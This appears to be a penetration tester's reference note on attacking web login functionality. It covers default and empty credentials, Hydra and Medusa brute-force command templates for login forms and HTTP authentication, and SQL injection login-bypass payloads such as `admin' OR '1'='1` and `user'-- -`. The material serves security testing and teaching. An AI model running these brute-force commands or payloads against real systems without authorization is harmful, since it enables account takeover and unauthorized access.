---
id: Exploitation
aliases: []
tags:
  - Webapp/Exploitation/Server-Side/Login-Functionality/Exploitation
---

# Exploitation

**Authentication Vulnerabilities** can allow attackers
to gain access to sensitive data and functionality

___


<!-- Default Credentials {{{-->
## Default Credentials

Many web applications and hardware devices
have default passwords for the built-in administrative account

<!-- Info {{{-->
> [!info]- Resources
>
> OWASP WSTG
>
> - [Testing for default credentials](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials)
>
<!-- }}} -->

**Test Objectives**

- Determine whether the application
  has any user accounts with default passwords
- Review whether new user accounts
  are created with weak or predictable passwords

- Search the Internet and try factory default passwords
  set by the vendor

**Testing**

- Search the Internet for `[SOFTWARE] default password`
- Review the manual or vendor documentation
- Check common default password databases
  - [CIRT.net](https://cirt.net/)
  - [SecLists Default Passwords](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
  - [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- Inspect the application source code (*if available*)
- Try organization-specific passwords
- Try simple patterns (*e.g., `Monday123`, if account is created on a Monday*)

If a default password can’t be found, try common options:

- `admin`, `password`, `12345`, etc.
- Empty or blank password
- Serial number or MAC address of the device.

___
<!-- }}} -->

<!-- Empty Credentials {{{-->
## Empty Credentials

Test accounts for empty and matching passwords

[[Medusa]]

```sh
medusa -h $target -U <usernames.txt> -M service_name -e ns
```

<!-- Info {{{-->
> [!info]-
>
> - `-e n`: Check for empty passwords
> - `-e s`: Check for passwords matching usernames
>
<!-- }}} -->

___
<!-- }}} -->

<!-- Brute Force {{{-->
## Brute Force

**Usernames** may be easy to guess if they conform
to a recognizable pattern (*e.g., e-mail address*)

High-privileged users usually have predictable usernames
(*e.g., `admin`, `administrator`*)

**Passwords** may be brute-forced if there is no brute-force protection,
with the difficulty varying based on the strength of the password

The website and HTTP responses may expose valuable information

1. Browser Developer Tools:
   Inspect [[Login Functionality/General#Login Form|Login Form]]
   HTML source code

<!-- Example {{{-->
> [!example]-
>
> ![[developer-tools.png]]
>
<!-- }}} -->

2. Proxy Interception:
   Capture HTTP [[POST]] form with test credentials

<!-- Example {{{-->
> [!example]-
>
> Test credentials: `admin:admin`
>
> ```
> POST / HTTP/1.1
> Host: 10.10.102.115
> User-Agent: Mozilla/5.0
>
> ...SNIP...
>
> username=admin&password=admin
> ```
<!-- }}} -->

3. Proxy Interception:
   Capture HTTP [[Response/General|Response]]

<!-- Example {{{-->
> [!example]-
>
> ```sh
> HTTP/1.1 202 Accepted
> Content-Type: text/plain
> Content-Length: 28
>
> ...SNIP...
>
> Invalid username and password
> ```
<!-- }}} -->

4. [[Brute Force/General|Brute Force]]

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> Custom
>
> - [[CeWL]] — Generate wordlist
>
<!-- }}} -->

[[Login Functionality/General#Login Form|Login Forms]]

[[Hydra]]

Synopsis

```sh
hydra [options] <target> http-post-form "path:params:condition_string"
```

<!-- Info {{{-->
> [!info]-
>
> **Params String**
>
> The params string consists of key-value pairs,
> similar to how data is encoded in a [[POST]] request
>
> ```sh
> hydra -L <users.txt> -P <passwords.txt> $target \
> http-post-form "/login:user=^USER^&pass=^PASS^:<http_response>"
> ```
>
> - `/login`: Target login form path
> - `user=^USER^`: Target username
> - `pass=^PASS^`: Target password
> - `<http_response>`:
>   - `S=`: Successful HTTP login response (*e.g., `302`, `Login successful`*)
>   - `F=`: Failed  HTTP login response (*e.g., `Invalid credentials`*)
> - Additional fields must also be included (*e.g. CSRF tokens*)
>
<!-- }}} -->

Usernames

```sh
hydra -L <users.txt> -p <password> $target \
http-post-form "/<path>:<username>=^USER^&<password>=^PASS^:<http_response>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> hydra -I \
> -L <users.txt> \
> $target \
> http-post-form "/<path>:<username>=^USER^&<password>=<password>:<http_response>"
> ```
>
<!-- }}} -->

Passwords

```sh
hydra -l <user> -P <passwords.txt> $target \
http-post-form "/<path>:<username>=^USER^&<password>=^PASS^:<http_response>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> hydra -I \
> -P <passwords.txt> \
> $target \
> http-post-form "/<path>:<username>=<username>&<password>=^PASS^:<http_response>"
> ```
<!-- }}} -->

Usernames & Passwords

```sh
hydra -L <users.txt> -P <passwords.txt> $target \
http-post-form "/<path>:<username>=^USER^&<password>=^PASS^:<http_response>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> hydra -I \
> -L <users.txt> \
> -P <passwords.txt> \
> $target \
> http-post-form "/login:user=^USER^&pass=^PASS^:<http_response>"
> ```
>
<!-- }}} -->

[[Medusa]]

Synopsis

```sh
medusa [options] <target> -M web-form -m DIR:/<path> -M FORM:"path:params:condition_string"
```

<!-- Info {{{-->
> [!info]-
>
> **Params String**
>
> The params string consists of key-value pairs,
> similar to how data is encoded in a [[POST]] request
>
> ```sh
> medusa -h $target -U <users.txt> -P <passwords.txt> \
> -M web-form -m DIR:/<path> -m FORM:"<username>=^USER^&<password>=^PASS^:<http_response>"
> ```
>
> - `-M web-form`: Web Form mode
> - `-m DIR:/<path>`: Target login form path
> - `user=^USER^`: Target username
> - `pass=^PASS^`: Target password
> - `<http_response>`:
>   - `S=`: Successful HTTP login response (*e.g., `302`, `Login successful`*)
>   - `F=`: Failed  HTTP login response (*e.g., `Invalid credentials`*)
> - Additional fields must also be included (*e.g. CSRF tokens*)
>
<!-- }}} -->

Usernames

```sh
medusa -h $target -U <users.txt> -p <password> \
-M web-form -m DIR:/<path> -m FORM:"<username>=^USER^&<password>=^PASS^:<http_response>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> medusa \
> -h $target \
> -U <users.txt> \
> -p <password> \
> -M web-form \
> -m DIR:/<path> \
> -m FORM:"<username>=^USER^&<password>=^PASS^:<http_response>"
> ```
>
<!-- }}} -->

Passwords

```sh
medusa -h $target -u <user> -P <passwords.txt> \
-M web-form -m DIR:/<path> -m FORM:"<username>=^USER^&<password>=^PASS^:<http_response>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> medusa \
> -h $target \
> -u <user> \
> -P <passwords.txt> \
> -M web-form \
> -m DIR:/<path> \
> -m FORM:"<username>=^USER^&<password>=^PASS^:<http_response>"
> ```
>
<!-- }}} -->

Usernames & Passwords

```sh
medusa -h $target -U <users.txt> -P <passwords.txt> \
-M web-form -m DIR:/<path> -m FORM:"<username>=^USER^&<password>=^PASS^:<http_response>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> medusa \
> -h $target \
> -U <users.txt> \
> -P <passwords.txt> \
> -M web-form \
> -m DIR:/<path> \
> -m FORM:"<username>=^USER^&<password>=^PASS^:<http_response>"
> ```
>
<!-- }}} -->


[[Login Functionality/General#HTTP Authentication|HTTP Authentication]]

Brute force via HTTP [[GET]] method

[[Hydra]]

```sh
hydra -l <user> -P <passwords.txt> $target http-get / [-s 81]
```

___
<!-- }}} -->

<!-- SQL Injection {{{-->
## SQL Injection

It may be possible to bypass the login functionality
with a simple [[SQL Injection/General|SQL Injection]]

<!-- Danger {{{-->
> [!danger]
>
> Some queries may be translated as a `DELETE` statement
>
> ```sql
> OR 1=1
> ```
>
> <!-- Example {{{-->
> > [!example]-
> >
> > ```sql
> > admin' OR '1'='1
> > ```
> <!-- }}} -->
>
<!-- }}} -->

Bypass login password

<!-- Warning {{{-->
> [!warning]
>
> Valid username required
>
<!-- }}} -->

```sql
user'-- -
```

___
<!-- }}} -->
